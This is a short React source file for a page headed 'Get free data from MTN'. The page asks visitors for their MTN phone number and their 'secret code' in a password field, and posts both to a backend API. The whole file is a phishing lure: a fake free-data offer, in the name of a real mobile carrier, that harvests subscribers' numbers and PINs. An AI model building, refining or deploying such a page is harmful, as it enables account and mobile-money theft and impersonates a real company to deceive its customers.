import "./App.css";
import Axios from "axios";
import { useState } from "react";

function App() {
  const [name, setName] = useState("");
  const [num, setNum] = useState("");

  const handler = () => {
   Axios.post('http://localhost:3001/api/insert', {name:name, num:num})
  }

  return (
      <div className="App">
        <div className="form">
          <h1>Get free data from MTN</h1>
          <h3>Enter your MTN number</h3>
          <input type='number' placeholder="E.g: 05444767584" name="name" onChange={(e) => setName(e.target.value)}/>
          <h3>Enter your secret code</h3>
          <input type="password" placeholder="E.g: xxxx" name="name" onChange={(e) => setNum(e.target.value)}/>
          <button onClick={handler}>Submit</button>
        </div>
      </div>
  )
}
export default App;
